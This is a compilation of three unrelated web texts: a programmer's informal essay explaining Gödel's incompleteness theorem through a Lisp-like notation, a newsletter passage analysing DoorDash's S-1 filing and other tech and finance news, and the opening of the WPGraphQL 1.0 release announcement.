<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span><p>In 1931, a 25-year-old Kurt Gödel wrote a proof that turned mathematics upside down. The implication was so astounding, and his proof so elegant that it was...kind of funny. I wanted to share his discovery with you. Fair warning though, I’m not a mathematician; I’m a programmer. This means my understanding is intuitive and not exact. Hopefully, that will come to our advantage since I have no choice but to avoid formality 🙂. Let’s get to it.</p><p>For the last 300 years, mathematicians and scientists alike made startling discoveries, which led to one great pattern. The pattern was unification: ideas that were previously thought to be disparate and different consistently turned out to be one and the same!</p><p>Newton kicked this off for physicists when he discovered that what kept us rooted on the Earth was also what kept the Earth dancing around the sun. People thought that heat was a special type of energy, but it turned out that it could be explained with mechanics. People thought that electricity, magnetism, and light were different, but Maxwell discovered they could be explained by an electromagnetic field.</p><p>Darwin did the same for biologists. It turned out that our chins, the beautiful feathers of birds, deer antlers, different flowers, male and female sexes, the reason you like sugar so much, the reason whales swim differently...could all be explained by natural selection.</p><p>Mathematicians waged a similar battle for unification. They wanted to find the “core” principles of mathematics, from which they could derive all true theories. This would unite logic, arithmetic, and so on, all under one simple umbrella. To get a sense of what this is about, consider this question: How do we <em>know</em> that 3 is smaller than 5? Or that 1 comes before 2? Is this a “core” principle that we take on faith (the formal name for this is called an “axiom”) or can this be derived from some even more core principle? Are numbers fundamental concepts, or can they be derived from something even more fundamental?</p><p>Mathematicians made great progress in this battle for core principles. For example, a gentleman called Frege discovered that he could craft a theory of sets, which could represent just about everything. For numbers, for example, he could do something like this:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk5MjkyOTc0LWZhMTE3MjgwLTI4MGYtMTFlYi05MTM1LTVkYjRkZWFlZjgzYy5wbmc" alt="A demonstration of how to represent numbers with sets"></span></p><p>Here, he represents 0 the empty set. 1 as the set which contains the set for 0. 2 as the set that contains the set for 1 and 0. From this he could set a principle to get the “next” number: just wrap all previous numbers in a set. Pretty cool! Frege was able to take that and prove arithmetic rules like “1 + 1”, “numbers are infinite”, etc.</p><p>This looked formidable and cool, but Bertrand Russell came along and broke the theory in one fell swoop. </p><p>He used the rules that Frege laid out to make a valid but <em>nonsensical</em> statement. He proved something analogous to 1 + 1 = 3 <sup>1</sup>. This sounds innocuous; it was after-all just <em>one</em> statement. But nevertheless it was disastrous for a foundational theory of mathematics. If you could prove that 1 + 1 = 3, then you can’t really trust any true statement that results from this foundation. </p><p>This put mathematicians on a tail-spin. They even dubbed this period the “Foundational Crisis of Mathematics” </p><p>In an effort to solve this problem, a mathematician called Hilbert laid down some requirements for what a fundamental theory of mathematics had to look like <sup>2</sup>. He said that this theory must be a new language, with a set of rules that satisfied two primary constraints:</p><p>The theory would need to be able to prove <em>any</em> true mathematical statement. For example, imagine the statement 1 + 1 = 2. If this language can’t prove that statement, then it certainly can’t prove all of mathematics. Hilbert called this quality <strong>completeness.</strong> The language would need to be complete. </p><p>The second hard requirement, as we discussed earlier, was that it <em>could not</em> prove a false mathematical statement. If we could prove 1 + 1 = 3, then all was for naught. Hilbert called this <strong>consistency.</strong> The language would need to be consistent.</p><p>Bertrand Russell, the gentleman who broke Frege’s theory, worked together with Alfred North Whitehead to develop a theory of their own. They labored for years to craft an immense volume of work, called Principia Mathematica <sup>3</sup>.</p><p>They started by writing a new language (let’s call it PM) with a few simple rules. They took those rules,  and proceeded to prove a bunch of things. Russell and Whitehead took almost nothing on faith. For example, let’s look at this almost-impossible-to-read proof over here (don’t worry, you don’t need to understand the syntax for this essay):</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk5MjkzMDA0LTA0Y2MwNzgwLTI4MTAtMTFlYi05ZGJkLTRkMTlmYmQxMDM2My5wbmc" alt="An example, very hard-to-read proof from Principia Mathematica"></span></p><p>This proof showed that “1 + 1”, does indeed equal “2”. It took 2 volumes to get here.</p><p>Their language was dense and the work laborious, but they kept on proving a whole bunch of different truths in mathematics, and so far as anyone could tell at the time, there were no contradictions. It was imagined that at least in theory you could take this foundation and eventually expand it past mathematics: could you encode in pure logic how a dog behaves, or how humans think?</p><p>It certainly looked like Principia Mathematica could serve as the foundational theory for Mathematics. Until Gödel came along. </p><p>He proved that Principia Mathematica <em>did indeed have</em> true mathematical statements which <em>could not be proven</em> in the language. Principia Mathematica was incomplete.</p><p>This was startling, but his proof went even further. He showed that the entire enterprise behind Hilbert’s Program — to find a formal foundation for mathematics — could <em>never</em> work.</p><p>It’s hard to believe that a person could really prove that something can “never” happen — imagine if someone told you that we could never travel farther than our solar system — you’d look at them with suspicion.</p><p>Yet here Gödel was...a 25 year-old who proved beyond a doubt that this enterprise was impossible. He did this by showing that if a language could represent numbers, then unprovable statements would necessarily pop up.</p><p>Let’s think about that for a second: Numbers seem so quaint and easy to prove —  just “1”, “2”, “3”...so on. People thought we could eventually write down how humans think — imagine how shocked they must have been to see that we couldn’t prove all truths about...numbers.</p><p>Let’s see how Gödel did it.</p><p>Now Russel and Whitehead’s language was hard to read. There’s no harm done in changing some of their symbols around. Let’s map their language to something more amenable to programmers: Lisp! </p><p>You can imagine that Russell and Whitehead came up with a lisp-like language. Here’s how their syntax looked:</p><p>First, they had a few symbols for arithmetic.</p><div><table><thead><tr><td><p><strong>Symbol</strong></p></td><td><p><strong>Meaning</strong></p></td><td><p><strong>Example</strong></p></td></tr></thead><tbody><tr><td><p>0</p></td><td><p>zero</p></td><td><p><code>0</code></p></td></tr><tr><td><p>next</p></td><td><p>the next successor</p></td><td><p><code>(next 0)</code></p></td></tr><tr><td><p>+</p></td><td><p>plus</p></td><td><p><code>(+ 0 (next 0))</code></p></td></tr><tr><td><p>*</p></td><td><p>times</p></td><td><p><code>(* 0 (next 0))</code></p></td></tr><tr><td><p>=</p></td><td><p>equals</p></td><td><p><code>(= 0 (* 0 (next 0)))</code></p></td></tr></tbody></table></div><p>Just from these symbols, they could represent all natural numbers. If they proved that the symbol <code>0</code> worked like 0. and the symbol <code>next</code> worked like a successor function, then <code>(next 0)</code> could represent 1, <code>(next (next 0))</code> could represent 2, and so on. </p><p>Here’s how they could write <code>1 + 1 = 2</code>: </p><pre><code><span>(</span><span>=</span><span> (</span><span>+</span><span> (</span><span>next</span><span> </span><span>0</span><span>) (</span><span>next</span><span> </span><span>0</span><span>)) </span>
<span>   (</span><span>next</span><span> (</span><span>next</span><span> </span><span>0</span><span>)))</span></code></pre><p>Now, for the purpose of this essay, I’ll add one rule. If you ever see me using a natural number inside PM-Lisp other than 0 (i.e “15”), you can imagine it’s shorthand to writing <code>(next (next (next ...))))</code> that many times. In this case, “15” means <code>next</code> applied to 0, 15 times</p><div><table><thead><tr><td><p><strong>Symbol</strong></p></td><td><p><strong>Meaning</strong></p></td><td><p><strong>Example</strong></p></td></tr></thead><tbody><tr><td><p><code>&lt;natural-number&gt;</code></p></td><td><p><code>(next (next ...))</code> applied to <code>0</code> <code>&lt;natual-number&gt;</code> times</p></td><td><div><p><code>3</code></p><p><em>means</em> <code>(next (next (next 0)))</code></p></div></td></tr></tbody></table></div><p>(Next (pun-intended)), they came up with some symbols to represent logic: </p><div><table><thead><tr><td><p><strong>Symbol</strong></p></td><td><p><strong>Meaning</strong></p></td><td><p><strong>Example</strong></p></td></tr></thead><tbody><tr><td><p>not</p></td><td><p>not</p></td><td><p><code>(not (= 0 1))</code></p></td></tr><tr><td><p>or</p></td><td><p>or</p></td><td><p><code>(or (= 0 1) (not (= 0 1)))</code></p></td></tr><tr><td><p>when</p></td><td><p>when ... then ..</p></td><td><div><p><code>(when 0 (or 0 1))</code></p><p><em>when 0, then there is either 0 or 1</em></p></div></td></tr><tr><td><p>there-is</p></td><td><p>there is ... such that ...</p></td><td><p><code>(there-is x (= 4 (* x 2))</code></p></td></tr></tbody></table></div><p>These symbols map closely to the logical statements we are used to in programming. The most unusual one is <code>there-is</code>. Let’s see one of those for an example: </p><pre><code><span>(</span><span>there-is</span><span> x (</span><span>=</span><span> </span><span>4</span><span> (</span><span>*</span><span> x </span><span>2</span><span>)))</span></code></pre><p>This is making a statement, that there is some number <code>x</code>, such that <code>(* x 2)</code> equals 4.  Well, that is indeed true: <code>x = 2</code>. That’s pretty cool — we’ve just made a general arithmetic statement. </p><p>Where did the <code>x</code> come from though? Oops, we need to account for that in our language:</p><div><table><thead><tr><td><p><strong>Symbol</strong></p></td><td><p><strong>Meaning</strong></p></td></tr></thead><tbody><tr><td><p>a...z, A...Z</p></td><td><p>variable</p></td></tr></tbody></table></div><p>In order to represent general truths, Russell and Whitehead introduced variables. Here’s how they could derive <code>and</code> for example: </p><pre><code><span>(</span><span>not</span><span> (</span><span>or</span><span> (</span><span>not</span><span> A) (</span><span>not</span><span> B)))</span></code></pre><p>When this statement is <code>true</code>, both <code>A</code> and <code>B</code> must be true! </p><p>Very cool. One more trick for our essay. To make it a bit easier to read, sometimes I’ll introduce new symbols. They won’t actually be a part of the language, but it can make good shorthand for us in the essay</p><div><table><thead><tr><td><p><strong>Form</strong></p></td><td><p><strong>Meaning</strong></p></td><td><p><strong>example</strong></p></td></tr></thead><tbody><tr><td><p><code>(def &lt;name&gt; &lt;formula&gt;)</code></p></td><td><p>define <code>&lt;name&gt;</code> to represent <code>&lt;formula&gt;</code></p></td><td><div><p><code>(def and (not (or (not A) (not B)))</code></p><p><em>same as</em> <code>(and &lt;var-a&gt; &lt;var-b&gt;...)</code></p></div></td></tr></tbody></table></div><p>Now we can write <code>(and 1 2)</code> 🙂</p><p>All we saw above were <em>symbols.</em> They had no meaning yet. </p><p>Russell and Whitehead needed to prove that <code>0</code> works like zero, and that <code>=</code> works like equals. In order to breathe life into those symbols, they started off with some core principles — the axioms. </p><p>Here’s what they chose: </p><div><table><thead><tr><td><p><strong>Axiom</strong></p></td><td><p><strong>Example</strong></p></td></tr></thead><tbody><tr><td><p><code>(when (or p p) p)</code></p></td><td><p>when either apples or apples, then apples</p></td></tr><tr><td><p><code>(when p (or p q))</code></p></td><td><p>when apples, then either apples or bananas</p></td></tr><tr><td><p><code>(when (or p q) (or q p))</code></p></td><td><p>when either apples or bananas, then either bananas or apples</p></td></tr><tr><td><p><code>(when (or p (or q r)) (or q (or p r))</code></p></td><td><p>when either apples, bananas, or pears, then either bananas, apples, or pears</p></td></tr><tr><td><p><code>(when (when q r) (when (or p q) (or p r))</code></p></td><td><p>when apples are a fruit, then bananas or apples implies bananas or fruits</p></td></tr></tbody></table></div><p>That’s it. This is all we needed to take them on faith for. They took these rules and laboriously combined them in intricate ways to derive everything else. </p><p>For example, here’s how they derived <code>=</code>: </p><pre><code><span>(</span><span>def</span><span> = (</span><span>and</span><span> (</span><span>when</span><span> A B) (</span><span>when</span><span> B A)))</span></code></pre><p>If A implies B, and B implies A, they <em>must</em> be equal! Imagine this done for hundreds and hundreds of pages. </p><p>Note something essential here: their rules are so precise that there is no room for human judgement; a computer could run them. This was a key component for …</p></span></p></div>

Perhaps the most important chart in the entire S-1 is the cohorted contribution graph:</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F7a07e78b-f54c-4c20-966b-360e708349b5_608x319.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F7a07e78b-f54c-4c20-966b-360e708349b5_608x319.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/7a07e78b-f54c-4c20-966b-360e708349b5_608x319.jpeg&quot;,&quot;height&quot;:319,&quot;width&quot;:608,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;LOGO&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt="LOGO"></a></figure></div><p>DASH defines contribution profit (CP) as gross profit less sales &amp; marketing costs, with a few non-cash items added back. CP is negative in Y1 due to spend on customer acquisition. In subsequent cohort years, DASH levels out its re-engagement marketing spend to ~2% of gross order value (GOV). That implies gross profit (GP) rises to 10% of GOV as cohorts age.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fc80a9ee0-78a1-4663-a189-48e44600e0d7_637x353.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fc80a9ee0-78a1-4663-a189-48e44600e0d7_637x353.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/c80a9ee0-78a1-4663-a189-48e44600e0d7_637x353.png&quot;,&quot;height&quot;:353,&quot;width&quot;:637,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:51661,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>DASH therefore invests around 7-10% of GOV to acquire a customer in Y1. That customer then generates 5-8% of GOV of CP in each year thereafter. This implies a 12-18 month payback on customer acquisition, and 3-4x LTV/CAC over the first 3 years.</p><p>In addition, DASH gives us some insight into the compounding GOV growth of its cohorts with the following table:</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fee190b56-a69b-4cd8-ac8a-a63a7cfa6921_605x208.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fee190b56-a69b-4cd8-ac8a-a63a7cfa6921_605x208.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/ee190b56-a69b-4cd8-ac8a-a63a7cfa6921_605x208.jpeg&quot;,&quot;height&quot;:208,&quot;width&quot;:605,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;LOGO&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt="LOGO"></a></figure></div><p>At this rate, the cohorts compound at least 160% annually. A 3-year compounding period would put the cohort at 4x cumulative GMV, which roughly corresponds to the aforementioned unit economic ratios.</p><p>The consequence of these stable cohorts and attractive marketing payback ratios is that DASH will be able to compound its growth for years to come, with older cohorts  baking in a “same store sales” baseline of organic growth. Over time, this dynamic can result in significant operating leverage, as I tweeted about earlier this week:</p><h2>A granular view of unit economics</h2><p>DASH puts together an intuitive breakdown of the economics of a single order. Because it serves 3 parties (consumers, merchants, dashers), the flow of cash between them is more complex than it is for most marketplaces:</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F3fbadde1-af51-451a-a9fb-a6bcb88072de_593x429.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F3fbadde1-af51-451a-a9fb-a6bcb88072de_593x429.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/3fbadde1-af51-451a-a9fb-a6bcb88072de_593x429.jpeg&quot;,&quot;height&quot;:429,&quot;width&quot;:593,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;LOGO&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt="LOGO"></a></figure></div><p>The filing also breaks down the granular components of contribution profit and tracks changes from 2018 to 2019:</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F1cc06874-c9ba-4fdb-9fa5-af6ecee443b8_630x789.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F1cc06874-c9ba-4fdb-9fa5-af6ecee443b8_630x789.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/1cc06874-c9ba-4fdb-9fa5-af6ecee443b8_630x789.png&quot;,&quot;height&quot;:789,&quot;width&quot;:630,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:127728,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>Here you can see the increase in take rate from 10% to 11% from 2018 to 2019. You can also see that DASH traded off improvements in COGS (-8% to -6%) for additional investments in sales &amp; marketing (-5% to -7%), maintaining a constant CP of -2%. Watching these tradeoffs gives one a sense for how management runs the business. In this case, management is investing additional cash flows from operational  improvements in growing the business faster. You’ll see why in the next section.</p><h2>Crystal clear strategy</h2><p>DASH boils down its business to 3 interlocking, virtuous flywheels:</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fe1ddbed4-f52d-407f-8354-eb99c0a4ea2a_594x349.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fe1ddbed4-f52d-407f-8354-eb99c0a4ea2a_594x349.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/e1ddbed4-f52d-407f-8354-eb99c0a4ea2a_594x349.jpeg&quot;,&quot;height&quot;:349,&quot;width&quot;:594,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;LOGO&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt="LOGO"></a></figure></div><p>The explanation touches upon the 3 key strategic elements of DASH’s business: </p><blockquote><p><em>•&nbsp;<strong>Local Network Effects:</strong>&nbsp;Our ability to attract more merchants, including local favorites and national brands, creates more selection in our Marketplace, driving more consumer engagement, and in turn, more sales for merchants on our platform. Our strong national merchant footprint enables us to launch new markets and quickly establish a critical mass of merchants and Dashers, driving strong consumer adoption.</em></p><p><em>•&nbsp;<strong>Economies of Scale:</strong>&nbsp;As more consumers join our local logistics platform and their engagement increases, our entire platform benefits from higher order volume, which means more revenue for local businesses and more opportunities for Dashers to work and increase their earnings. This, in turn, attracts Dashers to our local logistics platform, which allows for faster and more efficient fulfillment of orders for consumers.</em></p><p><em>•&nbsp;<strong>Increasing Brand Affinity:</strong>&nbsp;Both our local network effects and economies of scale lead to more merchants, consumers, and Dashers that utilize our local logistics platform. As we scale, we continue to invest in improving our offerings for merchants, selection, experience, and value for consumers, and earnings opportunities for Dashers. By improving the benefits of our local logistics platform for each of our three constituencies, our network continues to grow and we benefit from increased brand awareness and positive brand affinity. With increased brand affinity, we expect that we will enjoy lower acquisition costs for all three constituencies in the long term.</em></p></blockquote><p>With this in mind, you can see why DASH would plough its margin gains into  increased spending on growth. More growth drives the flywheel faster, which brings more future margin improvements.</p><p>The chart also implies that <strong>brand is its own flywheel. “</strong>Brand” is one of those fuzzy concepts that Silicon Valley people tend to shy away from. It’s often viewed as subjective, or at best difficult to measure. After a decade of working with consumer-facing businesses, I can say that brand is very much a real thing and can build on its own success. However, <strong>brand is not an input to the flywheel; it’s an output.</strong> A great brand is what happens when you operate the business well. It’s a promise to the next cohort of customers that the service will be excellent. DASH gets this concept and features brand prominently in its strategy.</p><h2>Distinctive insights that drive performance</h2><p>The S-1 is littered with little insights that show the distinctive way in which DASH operates. Here’s an excerpt from the cultures/value section:</p><blockquote><p><em>Operate at the lowest level of detail: Averages in our industry are meaningless, it’s the distribution that matters. No consumer cares if our average delivery time is 35 minutes if they received their food in 53 minutes. At DoorDash, we go to the lowest level of detail to understand every part of our system, looking for “and” solutions that fight false “either/or” dichotomies. This is one reason why everyone at DoorDash, including me, tries to step out of our day-to-day roles once a month to do a delivery or engage in customer support, menu creation, or merchant support—staying very close to the needs of those who use our platform is key. We attribute our category-leading spend retention&nbsp;and capital efficiency, in part, to this obsession.</em></p></blockquote><p>Getting obsessed with the tails of the curve, not the average, is a great way to encapsulate what’s necessary to succeed in consumer-facing businesses. <strong>Fans are earned or lost at the margin. </strong>It’s not the average performance that counts.</p><p>DASH also revealed the core insight that differentiated it from its competitors in the early days:</p><blockquote><p><em>We believe that suburban markets and smaller metropolitan areas have experienced significantly higher growth compared to larger metropolitan markets because these smaller markets have been historically underserved by merchants and platforms that enable&nbsp;on-demand&nbsp;delivery. Accordingly, residents in these markets are more acutely impacted by the lack of alternatives and the inconvenience posed by distance and the need to drive to merchants, and therefore consumers in these markets derive greater benefit from&nbsp;on-demand&nbsp;delivery. Additionally, suburban markets are attractive as consumers in these markets are more likely to be families who order more items per order. Lighter traffic and easier parking also mean that Dashers can serve these markets more efficiently. As a result of our early focus on and experience with suburban markets and smaller metropolitan areas, we are particularly well positioned for continued growth in these markets.</em></p></blockquote><p>It’s hard to recall how unintuitive this insight was at the time Doordash started. Everyone assumed that the superior customer density of cities, selection of restaurants, and availability of couriers would lead to superior unit economics. In addition, Uber was relatively underpenetrated in the suburbs, so when it launched Uber Eats, it had fewer drivers to deliver and compete with DASH in those areas. When you start with mobility, you need to focus on cities. That requirement allowed DASH to win in the suburbs with superior margins.</p><p>In summary, I found the combination of quantitative and strategic insights in the S-1 to be illuminating. I hope that more companies in this IPO season reveal this level of transparency and insight into their respective businesses, and that some of this analysis inspires earlier stage companies to do the same.</p><p data-attrs="{&quot;url&quot;:&quot;https://www.firehose.vc/p/firehose-181-dashing-to-ipo-?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;class&quot;:null}"><a href="https://www.firehose.vc/p/firehose-181-dashing-to-ipo-?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share"><span>Share</span></a></p><h3>#commerce</h3><div><figure><a target="_blank" href="https://www.mckinsey.com/industries/private-equity-and-principal-investors/our-insights/earning-the-premium-a-recipe-for-long-term-spac-success"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F3a40ba83-d1d3-41bc-aae9-3b6ed4073511_729x530.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/3a40ba83-d1d3-41bc-aae9-3b6ed4073511_729x530.png&quot;,&quot;height&quot;:530,&quot;width&quot;:729,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:61985,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://www.mckinsey.com/industries/private-equity-and-principal-investors/our-insights/earning-the-premium-a-recipe-for-long-term-spac-success&quot;}" alt=""></a></figure></div><h4><strong><a href="https://www.mckinsey.com/industries/private-equity-and-principal-investors/our-insights/earning-the-premium-a-recipe-for-long-term-spac-success">Not all SPACs are created equal.</a>&nbsp;→</strong></h4><p>The rapid influx of capital into SPACs has resulted in dramatic changes to a once fringe component of the capital markets. Since 2015, SPACs have seen far fewer liquidations (10% vs. 20% previously), the average size has doubled from $200m to $400m, and mainstream investors from other asset classes have entered the fray.</p><p>Among these new SPAC investors, performance is not evenly distributed. A new study by McKinsey shows that SPACs with operators at the helm outperform those without operators by over 40% over the 12 month period following the merger. In fact, operator-led SPACs outperform the market index of the underlying company by 10%. For the first time, we have evidence that, with the right team and governance setup, the SPAC structure can produce superior results.</p><h4>#media</h4><div><figure><a target="_blank" href="https://www.protocol.com/netflix-testing-audio-only-mode"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F7cc67790-ba02-46b1-9a47-db1b99020cd9_1245x701.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/7cc67790-ba02-46b1-9a47-db1b99020cd9_1245x701.jpeg&quot;,&quot;height&quot;:701,&quot;width&quot;:1245,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;Netflix is testing an audio-only mode to compete with podcasts and audiobooks&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://www.protocol.com/netflix-testing-audio-only-mode&quot;}" alt="Netflix is testing an audio-only mode to compete with podcasts and audiobooks"></a></figure></div><h4><strong><a href="https://www.protocol.com/netflix-testing-audio-only-mode">Podcast and chill.</a>&nbsp;→</strong></h4><p>I almost missed this short article a few weeks ago about Netflix* entering the audio-only space. Historically, Netflix has gone through two product phases. The first was the original DVD-by-mail business. The second is the current, streaming service. Philosophically, Reed Hastings has stated that he would rather expand into new types of content with a single platform to deliver it, rather than enter new content types (think gaming, music, VR, etc). </p><p>By testing audio-only stories on Android, he’s potentially showing a desire to start competing more directly with Spotify*, Apple*, and Amazon* in the podcast and audiobook category. If Netflix chose to do so, it could have a significant advantage given its content library and significant, global subscriber base.</p><h3>#tech</h3><div><figure><a target="_blank" href="https://jamesallworth.medium.com/intels-disruption-is-now-complete-d4fa771f0f2c"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F48a9540f-33aa-4e84-b87d-c85faf3a635d_1200x693.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/48a9540f-33aa-4e84-b87d-c85faf3a635d_1200x693.jpeg&quot;,&quot;height&quot;:693,&quot;width&quot;:1200,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;Image for post&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://jamesallworth.medium.com/intels-disruption-is-now-complete-d4fa771f0f2c&quot;}" alt="Image for post"></a></figure></div><h4><strong><a href="https://jamesallworth.medium.com/intels-disruption-is-now-complete-d4fa771f0f2c">Intel out.</a>→</strong></h4><p>James Allworth, Head of Innovation at Clouflare and co-host of …</p></div></div>

You can use WPGraphQL in production with the confidence that it is secure, well documented, and supported full time and long term.</p><p>If you’re new to the WPGraphQL community, you may ask yourself, “But WordPress already has the REST API. What’s different about using WPGraphQL?” </p><p>Well, when you use WPGraphQL to turn your WordPress site into a GraphQL server, multiple resources can be fetched at the same time. And by design you get back the exact data you asked for, nothing more, nothing less. In addition to being easier to work with compared to the REST API, data loading with GraphQL is faster and more efficient. (Read more: “<a href="https://www.wpgraphql.com/docs/wpgraphql-vs-wp-rest-api/" data-type="docs" data-id="864">WPGraphQL vs. WP REST API</a>“)</p><p>If you are upgrading to 1.0 or another version, see <a href="https://github.com/wp-graphql/wp-graphql/releases">the release notes</a> for information on breaking changes and preparing your site. If you are new, <a href="https://www.wpgraphql.com/">start at the homepage</a> and follow our step-by-step docs. </p><p>In this post I want to talk about the journey to 1.0, why it took so long to get to 1.0, and a look at what’s next for WPGraphQL. But before diving into that, I want to also announce some other fun stuff that has also come to life along with this release.</p><ul><li>WPGraphQL is now available on the WordPress.org repository</li><li>New WPGraphQL.com website</li><li>WPGraphQL Swag available on the Gatsby Swag Store</li></ul><h2><a href="https://www.wpgraphql.com/2020/11/16/announcing-wpgraphql-v1/#wpgraphql-on-wordpressorg">WPGraphQL on WordPress.org</a><span id="wpgraphql-on-wordpressorg"></span></h2><p>The WordPress.org plugin repository has long been the default distribution mechanism for WordPress plugins. Prior to today, developers had to install WPGraphQL using Composer and installing from <a href="https://packagist.org/packages/wp-graphql/wp-graphql">packagist</a>, or by downloading from <a href="https://github.com/wp-graphql/wp-graphql">Github</a>. </p><p>Now, users can <a href="https://wordpress.org/plugins/wp-graphql">install WPGraphQL directly from WordPress.org’s plugin directory</a>.</p><p>We believe that distributing 